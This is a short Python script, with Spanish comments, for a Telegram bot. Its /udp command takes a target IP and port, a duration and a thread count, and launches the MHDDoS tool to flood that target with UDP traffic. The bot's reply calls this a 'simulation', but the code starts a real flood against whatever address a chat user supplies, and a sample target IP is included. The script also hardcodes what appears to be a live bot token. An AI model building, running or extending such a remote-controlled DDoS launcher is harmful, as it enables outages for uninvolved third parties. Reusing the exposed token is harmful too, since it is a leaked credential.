from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext
import subprocess

# Token del bot
TOKEN = "7807495947:AAGvrDQJ0WpnjXLFPhkDsdOB6ql2m7rN0hc"

# Comando para iniciar un ataque UDP
def udp_attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    
    # Verifica que el usuario haya ingresado los parámetros necesarios
    if len(context.args) < 3:
        update.message.reply_text("Uso: /udp <IP:Puerto> <Duración> <Threads>\nEjemplo: /udp 143.92.114.176:10015 53 999")
        return

    # Obtiene los argumentos del mensaje
    target = context.args[0]  # Dirección IP:Puerto
    duration = context.args[1]  # Duración en segundos
    threads = context.args[2]  # Número de threads

    # Construye el comando a ejecutar
    command = f"python3 /workspaces/MHDDoS/start.py UDP {target} {duration} {threads}"
    
    # Ejecuta el comando y responde al usuario
    try:
        process = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        update.message.reply_text(f"Simulación UDP iniciada:\n- Target: {target}\n- Duración: {duration} segundos\n- Threads: {threads}")
    except Exception as e:
        update.message.reply_text(f"Error al ejecutar el comando:\n{str(e)}")

# Configuración principal del bot
def main():
    updater = Updater(TOKEN)
    dp = updater.dispatcher

    # Agrega el handler para el comando /udp
    dp.add_handler(CommandHandler("udp", udp_attack))

    # Inicia el bot
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
